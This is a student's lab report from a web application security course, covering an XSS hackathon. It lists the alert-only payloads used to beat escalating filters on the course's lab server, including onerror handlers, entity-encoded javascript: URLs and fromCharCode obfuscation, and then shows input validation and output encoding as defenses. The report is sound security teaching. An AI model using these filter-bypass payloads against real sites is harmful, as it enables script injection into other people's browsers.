# WAPH-Web Application Programming and Hacking

## Instructor: Dr. Phu Phung

## Student

**Name**: Sophia Munoz

**Email**: [mailto:munozsa@mail.uc.edu](munozsa@mail.uc.edu)

![Sophia's headshot](../../images/headshot.jpg)

# Hackathon 1 - Cross-Site Scripting Attacks and Defenses

## The Lab's Overview

For Hackathon 1, there were two tasks. Task 1 focused on cross-site scripting attacks at increasing levels of difficulty. They required injecting code to get an alert\(). Task 2 focused on the implementation of input validation and XSS defense methods in previous Labs 1 and 2.

Outcomes I learned from this hackathon were the various hacking methods to bypass filters and protections placed client-side and server-side. This allowed for a better understanding on vulnerabilities when programming a web application and promoted the best ways to protect and defend your web apps from hackers.

Hackathon1 Folder: [https://github.com/munozsophia/waph-munozsa/tree/main/hackathons/hackathon1](https://github.com/munozsophia/waph-munozsa/tree/main/hackathons/hackathon1).

### Task 1: Attacks

The section covers the cross-site scripting injections used to hack into 7 Levels of webpages.

#### a. Level 0

Below is the XSS code injected into the input form:

`<script>alert("Level 0-Hacked by Sophia Munoz")</script>`

![Level 0 Injected XSS and Payload Attack](../../images/level-0-attack.png)
*Level 0 Injected XSS and Payload Attack*

#### b. Level 1

Below is the XSS code injected into the URL:

`https://waph-hackathon.eastus.cloudapp.azure.com/xss/level1/echo.php?input=<script>alert("Level 1-Hacked by Sophia Munoz")</script>`

![Level 1 Injected XSS and Payload Attack](../../images/level-1-attack.png)
*Level 1 Injected XSS and Payload Attack*

#### c. Level 2

Below is the XSS code injected into the console:

```html
var f = document.createElement('form');
f.method = 'POST';
f.action = '';
var i = document.createElement('input');
i.name = 'input';
i.value = '<script>alert("Level 2-Hacked by Sophia Munoz")</script>';
f.appendChild(i);
document.body.appendChild(f);
f.submit();
```

Assuming the method used was the `POST` method. The vulnerability is exploited in the `echo.php` web application on this line of code: `echo $_POST['input']`

![Level 2 Injected XSS and Payload Attack](../../images/level-2-attack.png)
*Level 2 Injected XSS and Payload Attack*

#### d. Level 3

Below is the XSS code injected into the URL:

`https://waph-hackathon.eastus.cloudapp.azure.com/xss/level3/echo.php?input=<img src=x onerror="alert('Level 3-Hacked by Sophia Munoz')">`

Assuming the method used was the `GET` method. The vulnerability is exploited in the fact that only `<script>` and `</script>` were filtered out, but other event handlers like the one used to inject in the URL \(`onerror`) weren't handled at all.

![Level 3 Injected XSS and Payload Attack](../../images/level-3-attack.png)
*Level 3 Injected XSS and Payload Attack*

#### e. Level 4

Below is the XXS code injected into the URL:

`https://waph-hackathon.eastus.cloudapp.azure.com/xss/level4/echo.php?input=<a href="java%26%23115%3Bcript:alert('Level 4-Hacked by Sophia Munoz')">Click Me</a>`

I URL encoded the `&` in `&#115;`. The ampersand essentially acts as URL parameter separator. Assuming the method used was the `GET` method. The vulnerability is exploited by a line like `echo $input`. Even `script` wasn't detected as it wasn't a literal letter-for-letter string.

![Level 4 Injected XSS and Payload Attack](../../images/level-4-attack.png)
*Level 4 Injected XSS and Payload Attack*

#### f. Level 5

Below is the XXS code injected into the URL:

`https://waph-hackathon.eastus.cloudapp.azure.com/xss/level5/echo.php?input=<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,39,76,101,118,101,108,32,53,45,72,97,99,107,101,100,32,98,121,32,83,111,112,104,105,97,32,77,117,110,111,122,39,41))>`

I used `fromCharCode` to encode `alert` as to not have it be detected. Assuming the method used was the `GET` method. The vulnerability is like the previous level, `echo $input`, but it now also includes `alert` instead of just `script`.

![Level 5 Injected XSS and Payload Attack](../../images/level-5-attack.png)
*Level 5 Injected XSS and Payload Attack*

#### g. Level 6

### Task 2: Defenses

This section modifies vulnerable code from Lab 1 and Lab 2 by the using input validation and XSS defense methods.

#### a. Input Validation Implementation

**`echo.php`**

![echo.php Revision](../../images/echo-php-validation-defense.png)
*echo.php Revision*

The code specifically implementing validation is below. It checks to see if the data is not missing.

```PHP
if (!isset($_REQUEST['data'])) {
   die("{\"error\": \"Please provide 'data' field\"}");
}
```

**`waph-munozsa.html`**

![waph-munozsa.html getEcho() Revision](../../images/waph-munozsa-html-getecho.png)
*waph-munozsa.html getEcho() Revision*

![waph-munozsa.html jQueryAjax() Validation Revision](../../images/waph-munozsa-html-jquery-valid.png)
*waph-munozsa.html jQueryAjax() Validation Revision*

![waph-munozsa.html jQueryAjaxPost() Validation Revision](../../images/waph-munozsa-html-jquerypost-valid.png)
*waph-munozsa.html jQueryAjaxPost() Validation Revision*

![waph-munozsa.html jokeAPI Validation Revision](../../images/waph-munozsa-html-jokeAPI-valid.png)
*waph-munozsa.html jokeAPI Validation Revision*

![waph-munozsa.html guessAge() Validation Revision](../../images/waph-munozsa-html-guessage-valid.png)
*waph-munozsa.html guessAge() Validation Revision*

**`email.js`**

Looking over the code of email.js, there doesn't seem to be any external input from the user. The email is hardcoded into the code, so I don't see a need for input validation.

#### b. XSS Defenses

**`echo.php`**

The code specifically implementing XSS defense is below. It encodes the data output. The image from the previous section shows the image with the `echo.php` revision.

```PHP
echo htmlentities($_REQUEST['data']);
```

**`waph-munozsa.html`**

The implementation of the code below makes it simpler to encode the data in the other functions.

![waph-munozsa.html Encode Input Function](../../images/waph-munozsa-html-encode-input.png)
*waph-munozsa.html Encode Input Function*

![waph-munozsa.html jQueryAjax() Defense Revision](../../images/waph-munozsa-html-jquery-defense.png)
*waph-munozsa.html jQueryAjax() Defense Revision*

I didn't realize until later that I had missed implementing the encodeInput\() function for one piece of data so there are two revisions for jQueryAjaxPost.

![waph-munozsa.html jQueryAjaxPost() Defense Revision](../../images/waph-munozsa-html-jquerypost-defense.png)
*waph-munozsa.html jQueryAjaxPost() Defense Revision*

![waph-munozsa.html jQueryAjaxPost() Defense Revision Fix](../../images/waph-munozsa-html-jquerypost-defense-fix.png)
*waph-munozsa.html jQueryAjaxPost() Defense Revision Fix*

![waph-munozsa.html jokeAPI Defense Revision](../../images/waph-munozsa-html-jokeAPI-defense.png)
*waph-munozsa.html jokeAPI Defense Revision*

![waph-munozsa.html guessAge() Defense Revision](../../images/waph-munozsa-html-guessage-defense.png)
*waph-munozsa.html guessAge() Defense Revision*

**`email.js`**

The use of `innerHTML` provides a way to inject the tag `<a>`, but as previously mentioned above, due to the email being hardcoded in the file, there seems to be no risk of cross-site scripting.